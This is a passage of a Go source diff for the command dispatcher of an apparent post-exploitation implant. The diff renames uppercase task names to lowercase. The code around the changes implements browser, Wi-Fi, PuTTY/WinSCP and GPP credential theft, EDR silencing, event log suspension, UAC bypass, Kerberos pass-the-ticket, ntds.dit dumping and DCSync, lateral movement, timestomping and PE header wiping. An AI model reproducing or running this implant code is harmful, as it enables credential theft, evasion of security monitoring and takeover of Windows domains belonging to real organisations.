 		t.sendResult(task.ID, fmt.Sprintf("[+] screenwatch started (interval %ds)", intervalSec), "")
 
-	case "SCREENWATCH_STOP":
+	case "screenwatch_stop":
 		t.sendResult(task.ID, stopScreenWatchCmd(), "")
 
 	// ── BOF Store ────────────────────────────────────────────────────────────
 
-	case "BOF_STORE_LOAD":
+	case "bof_store_load":
 		name := strings.TrimSpace(task.Args)
 		if name == "" {
 			t.sendResult(task.ID, "", "usage: BOF_STORE_LOAD <name> (payload=base64 COFF)")
@@ -1713,33 +1713,33 @@ func dispatchTask(t transport, task taskWire) {
 		bofDSLoad(name, data)
 		t.sendResult(task.ID, fmt.Sprintf("[+] BOF '%s' loaded into store (%d bytes)", name, len(data)), "")
 
-	case "BOF_STORE_LIST":
+	case "bof_store_list":
 		t.sendResult(task.ID, bofDSList(), "")
 
-	case "BOF_STORE_UNLOAD":
+	case "bof_store_unload":
 		name := strings.TrimSpace(task.Args)
 		bofDSRemove(name)
 		t.sendResult(task.ID, fmt.Sprintf("[+] BOF '%s' removed from store", name), "")
 
 	// ── EDR Silencing (WFP firewall rule) ─────────────────────────────────────
 
-	case "EDR_SILENCE":
+	case "edr_silence":
 		t.sendResult(task.ID, edrSilence(task.Args), "")
 
-	case "EDR_SILENCE_RM":
+	case "edr_silence_rm":
 		t.sendResult(task.ID, edrSilenceRemove(task.Args), "")
 
 	// ── Event Log Suspension ──────────────────────────────────────────────────
 
-	case "EVENTLOG_SUSPEND":
+	case "eventlog_suspend":
 		t.sendResult(task.ID, eventlogSuspend(), "")
 
-	case "EVENTLOG_RESUME":
+	case "eventlog_resume":
 		t.sendResult(task.ID, eventlogResume(), "")
 
 	// ── UAC Bypass ───────────────────────────────────────────────────────────
 
-	case "ELEVATE":
+	case "elevate":
 		// Args: "fodhelper <cmd>" | "computerdefaults <cmd>" | "cmlua <cmd>"
 		parts := strings.SplitN(strings.TrimSpace(task.Args), " ", 2)
 		method := ""
@@ -1763,10 +1763,10 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── Kerberos operations ───────────────────────────────────────────────────
 
-	case "KERB_LIST":
+	case "kerb_list":
 		t.sendResult(task.ID, kerberosListTickets(), "")
 
-	case "KERB_PTT":
+	case "kerb_ptt":
 		// Args JSON: {"ticket":"<base64-encoded .kirbi>"}
 		var ka struct {
 			Ticket string `json:"ticket"`
@@ -1781,12 +1781,12 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, kerberosPassTheTicket(ka.Ticket), "")
 
-	case "KERB_PURGE":
+	case "kerb_purge":
 		t.sendResult(task.ID, kerberosPurge(), "")
 
 	// ── Inline PE execution ───────────────────────────────────────────────────
 
-	case "EXEC_PE":
+	case "exec_pe":
 		// Payload: base64-encoded raw PE bytes. Args (optional): command-line hint.
 		if task.Payload == "" {
 			t.sendResult(task.ID, "", "EXEC_PE: empty payload")
@@ -1801,18 +1801,18 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── PEB Masquerading ──────────────────────────────────────────────────────
 
-	case "PEB_SPOOF":
+	case "peb_spoof":
 		t.sendResult(task.ID, pebSpoof(strings.TrimSpace(task.Args)), "")
 
 	// ── HWBP Clear ────────────────────────────────────────────────────────────
 
-	case "HWBP_CLEAR":
+	case "hwbp_clear":
 		clearHardwareBreakpoints()
 		t.sendResult(task.ID, "[+] hardware breakpoints cleared", "")
 
 	// ── GPP Passwords (MS14-025) ─────────────────────────────────────────────
 
-	case "GPP_PASSWORDS":
+	case "gpp_passwords":
 		creds, err := huntGPPPasswords()
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -1823,7 +1823,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── WiFi credentials ─────────────────────────────────────────────────────
 
-	case "WIFI_CREDS":
+	case "wifi_creds":
 		creds, err := stealWifiCreds()
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -1838,7 +1838,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── SessionGopher — PuTTY / WinSCP / FileZilla / SuperPuTTY / RDP ────────
 
-	case "SESSION_CREDS":
+	case "session_creds":
 		creds, err := stealSessionCreds()
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -1849,7 +1849,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── Browser credentials + Windows Credential Manager ────────────────────
 
-	case "BROWSER_CREDS":
+	case "browser_creds":
 		creds, err := stealBrowserCreds()
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -1861,7 +1861,7 @@ func dispatchTask(t transport, task taskWire) {
 	// ── File search ──────────────────────────────────────────────────────────
 	// Args: "[root] <pattern>"   e.g. "*.kdbx"  or  "C:\Users *.pfx"
 
-	case "SEARCH":
+	case "search":
 		parts := strings.Fields(task.Args)
 		if len(parts) == 0 {
 			t.sendResult(task.ID, "", "usage: search [root] <pattern>  — e.g. search *.kdbx")
@@ -1882,7 +1882,7 @@ func dispatchTask(t transport, task taskWire) {
 	// ── Timestomping ─────────────────────────────────────────────────────────
 	// Args: "<file> [YYYY-MM-DD|ref_file]"   ref_file defaults to kernel32.dll
 
-	case "TIMESTOMP":
+	case "timestomp":
 		parts := strings.SplitN(strings.TrimSpace(task.Args), " ", 2)
 		if len(parts) == 0 || parts[0] == "" {
 			t.sendResult(task.ID, "", "usage: timestomp <file> [YYYY-MM-DD|ref_file]")
@@ -1905,7 +1905,7 @@ func dispatchTask(t transport, task taskWire) {
 	// ADS_WRITE <file>:<stream>   (payload = base64 data)
 	// ADS_DEL   <file>:<stream>
 
-	case "ADS_LIST":
+	case "ads_list":
 		path := strings.TrimSpace(task.Args)
 		if path == "" {
 			t.sendResult(task.ID, "", "usage: ads list <file>")
@@ -1918,7 +1918,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, "")
 
-	case "ADS_READ":
+	case "ads_read":
 		arg := strings.TrimSpace(task.Args)
 		idx := strings.LastIndex(arg, ":")
 		if idx <= 0 {
@@ -1932,7 +1932,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, string(data), "")
 
-	case "ADS_WRITE":
+	case "ads_write":
 		arg := strings.TrimSpace(task.Args)
 		idx := strings.LastIndex(arg, ":")
 		if idx <= 0 || task.Payload == "" {
@@ -1950,7 +1950,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] wrote %d bytes to %s", len(raw), arg), "")
 
-	case "ADS_DEL":
+	case "ads_del":
 		arg := strings.TrimSpace(task.Args)
 		idx := strings.LastIndex(arg, ":")
 		if idx <= 0 {
@@ -1965,7 +1965,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── ntds.dit dump via ntdsutil ────────────────────────────────────────────
 
-	case "NTDS_DUMP":
+	case "ntds_dump":
 		outDir := strings.TrimSpace(task.Args)
 		if outDir == "" {
 			outDir = `C:\Windows\Temp\ntdsutil_out`
@@ -1978,7 +1978,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, fmt.Sprintf("[+] ntds.dit dump to %s\n%s", outDir, out), errStr)
 
-	case "DCSYNC":
+	case "dcsync":
 		// Extract ntds.dit + SYSTEM hive via IFM (default) or VSS, upload both files.
 		// Args JSON: {"mode":"ifm|vss","out":"C:\\Users\\Public\\dcsync_out"}
 		// Offline parsing: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
@@ -2043,7 +2043,7 @@ func dispatchTask(t transport, task taskWire) {
 	// Args JSON: {"method":"psexec|wmi|winrm|ssh|dcom","host":"<ip>","payload":"<file>",
 	//             "svcname":"<opt>","user":"<opt DOMAIN\\user>","pass":"<opt>"}
 
-	case "JUMP", "LATERAL":
+	case "jump", "LATERAL":
 		var la struct {
 			Method    string `json:"method"`
 			Host      string `json:"host"`
@@ -2106,7 +2106,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── Registry ──────────────────────────────────────────────────────────────
 
-	case "REG_QUERY":
+	case "reg_query":
 		var args struct {
 			Path string `json:"path"`
 			Name string `json:"name"`
@@ -2122,7 +2122,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "REG_SET":
+	case "reg_set":
 		var args struct {
 			Path  string `json:"path"`
 			Name  string `json:"name"`
@@ -2139,7 +2139,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "REG_DELETE":
+	case "reg_delete":
 		var args struct {
 			Path string `json:"path"`
 			Name string `json:"name"`
@@ -2155,7 +2155,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "REG_LIST":
+	case "reg_list":
 		var args struct {
 			Path string `json:"path"`
 		}
@@ -2172,7 +2172,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── SSH Command Execution ─────────────────────────────────────────────────
 
-	case "SSH_EXEC":
+	case "ssh_exec":
 		var args struct {
 			Host string `json:"host"`
 			Port int    `json:"port"`
@@ -2197,7 +2197,7 @@ func dispatchTask(t transport, task taskWire) {
 
 	// ── Parity aliases & stubs ───────────────────────────────────────────────
 
-	case "PE_EXEC":
+	case "pe_exec":
 		if task.Payload == "" {
 			t.sendResult(task.ID, "", "PE_EXEC: empty payload")
 			return
@@ -2209,7 +2209,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, execPE(pebytes, task.Args), "")
 
-	case "NETSTAT":
+	case "netstat":
 		out, err := runShell("netstat -ano")
 		errStr := ""
 		if err != nil {
@@ -2217,7 +2217,7 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
-	case "NET_USE":
+	case "net_use":
 		var nu struct {
 			Share string `json:"share"`
 			User  string `json:"user"`
@@ -2227,11 +2227,11 @@ func dispatchTask(t transport, task taskWire) {
 		out, _ := runShell(fmt.Sprintf(`net use "%s" "%s" /user:"%s" 2>&1`, nu.Share, nu.Pass, nu.User))
 		t.sendResult(task.ID, out, "")
 
-	case "NET_USE_DEL":
+	case "net_use_del":
 		out, _ := runShell(fmt.Sprintf(`net use "%s" /delete /yes 2>&1`, strings.TrimSpace(task.Args)))
 		t.sendResult(task.ID, out, "")
 
-	case "ADCS_REQUEST":
+	case "adcs_request":
 		var ar struct {
 			CA       string `json:"ca"`
 			Template string `json:"template"`
@@ -2242,33 +2242,33 @@ func dispatchTask(t transport, task taskWire) {
 		json.Unmarshal([]byte(task.Args), &ar)
 		t.sendResult(task.ID, adcsRequest(ar.CA, ar.Template, ar.Subject, ar.SAN, ar.Out), "")
 
-	case "WHOAMI":
+	case "whoami":
 		out, _ := runShell("whoami /all")
 		t.sendResult(task.ID, out, "")
 
-	case "IPCONFIG":
+	case "ipconfig":
 		out, _ := runShell("ipconfig /all")
 		t.sendResult(task.ID, out, "")
 
-	case "USERNAME", "USER":
+	case "username", "USER":
 		v := os.Getenv("USERNAME")
 		if v == "" {
 			v = os.Getenv("USER")
 		}
 		t.sendResult(task.ID, v, "")
 
-	case "COMPUTERNAME":
+	case "computername":
 		v := os.Getenv("COMPUTERNAME")
 		if v == "" {
 			v, _ = os.Hostname()
 		}
 		t.sendResult(task.ID, v, "")
 
-	case "WIPE_MZ":
+	case "wipe_mz":
 		wipePEHeaders()
 		t.sendResult(task.ID, "[+] MZ header wiped", "")
 
-	case "GPP_HUNT":
+	case "gpp_hunt":
 		creds, err := huntGPPPasswords()
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -2277,7 +2277,7 @@ func dispatchTask(t transport, task taskWire) {
 		data, _ := json.MarshalIndent(creds, "", "  ")
 		t.sendResult(task.ID, string(data), "")
 
-	case "CRED_WIFI":
+	case "cred_wifi":
 		creds, err := stealWifiCreds()
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -2290,7 +2290,7 @@ func dispatchTask(t transport, task taskWire) {
 		data, _ := json.MarshalIndent(creds, "", "  ")
 		t.sendResult(task.ID, string(data), "")
 
-	case "SESSION_GOPHER":
+	case "session_gopher":
 		creds, err := stealSessionCreds()
 		if err != nil {
 			t.sendResult(task.ID, "", err.Error())
@@ -2299,23 +2299,23 @@ func dispatchTask(t transport, task taskWire) {
 		data, _ := json.MarshalIndent(creds, "", "  ")
 		t.sendResult(task.ID, string(data), "")
 
-	case "DETECTED":
+	case "detected":
 		t.sendResult(task.ID, "[!] DETECTED flag acknowledged", "")
 
-	case "HOME", "USERPROFILE":
+	case "home", "USERPROFILE":
 		t.sendResult(task.ID, os.Getenv("USERPROFILE"), "")
 
-	case "USERDOMAIN":
+	case "userdomain":
 		t.sendResult(task.ID, os.Getenv("USERDOMAIN"), "")
 
-	case "TEMP":
+	case "temp":
 		v := os.Getenv("TEMP")
 		if v == "" {
 			v = os.Getenv("TMP")
 		}
 		t.sendResult(task.ID, v, "")
 
-	case "DISPLAY":
+	case "display":
 		t.sendResult(task.ID, os.Getenv("DISPLAY"), "")
 
 	default:
